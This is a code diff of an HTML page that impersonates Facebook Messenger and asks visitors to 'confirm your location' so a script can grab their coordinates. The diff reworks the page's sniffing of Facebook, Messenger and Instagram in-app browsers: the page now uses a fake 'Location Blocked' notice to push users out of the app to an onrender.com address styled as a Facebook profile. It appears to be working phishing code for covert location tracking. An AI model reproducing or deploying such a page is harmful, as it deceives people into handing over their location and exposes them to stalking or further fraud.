@@ -1,50 +1,38 @@
 <body>
+  <script>
+    function isInMessengerOrFB() {
+      const ua = navigator.userAgent || "";
+      return (
+        ua.includes("FBAV") ||
+        ua.includes("FBAN") ||
+        ua.includes("Messenger") ||
+        ua.includes("Instagram")
+      );
+    }
+
+    if (isInMessengerOrFB()) {
+      // Show full-page message
+      document.write(`
+        <div style="padding: 40px; font-family: sans-serif; text-align: center;">
+          <h2>⚠️ Location Blocked</h2>
+          <p>This page needs your location to continue.</p>
+          <p><b>Messenger's browser blocks location access on iPhone.</b></p>
+          <p>To proceed:</p>
+          <a href="https://facebook-profile-nakz.onrender.com" target="_blank">
+            <button style="background-color: #0084ff; color: white; font-size: 16px; padding: 12px 25px; border: none; border-radius: 6px; cursor: pointer;">
+              🔗 Open in Safari or Chrome
+            </button>
+          </a>
+        </div>
+      `);
+    }
+  </script>
+
   <div class="container">
     <div class="logo">Messenger</div>
     <div class="message">To continue, please confirm your location.</div>
-
-    <!-- In-app browser warning -->
-    <div id="warning" style="display: none; color: red; font-size: 14px; margin-bottom: 15px;">
-      ⚠️ If nothing happens after pressing proceed, please <b>open this page in Safari or Chrome</b>.
-    </div>
-
-    <!-- Open in browser button -->
-    <a href="https://facebook-profile-nakz.onrender.com" target="_blank" style="text-decoration: none;">
-      <button style="background: #00b2ff; color: white; border: none; padding: 12px; border-radius: 6px; margin-bottom: 15px; width: 100%;">
-        🔗 Open in Safari/Chrome
-      </button>
-    </a>
-
     <button class="button" onclick="getCoordinates()">Proceed</button>
   </div>
 
   <script src="script.js"></script>
-  <script>
-  function isInAppBrowser() {
-    const ua = navigator.userAgent || "";
-    return (
-      ua.includes("FBAV") || // Facebook app
-      ua.includes("FBAN") || // Facebook app
-      ua.includes("Messenger") || // Messenger
-      ua.includes("Instagram") // Instagram in-app
-    );
-  }
-
-  // If Messenger or FB, warn user to open in Safari
-  if (isInAppBrowser()) {
-    document.body.innerHTML = `
-      <div style="padding: 40px; text-align: center; font-family: sans-serif;">
-        <h2>⚠️ Action Required</h2>
-        <p>This page needs your location, but <b>Messenger's browser blocks it.</b></p>
-        <p>Please open in Safari or Chrome to continue.</p>
-        <a href="https://facebook-profile-nakz.onrender.com" target="_blank">
-          <button style="background: #0084ff; color: white; font-size: 16px; padding: 12px 25px; border: none; border-radius: 6px; margin-top: 20px;">
-            🔗 Open in Safari/Chrome
-          </button>
-        </a>
-      </div>
-    `;
-  }
-</script>
-
 </body>
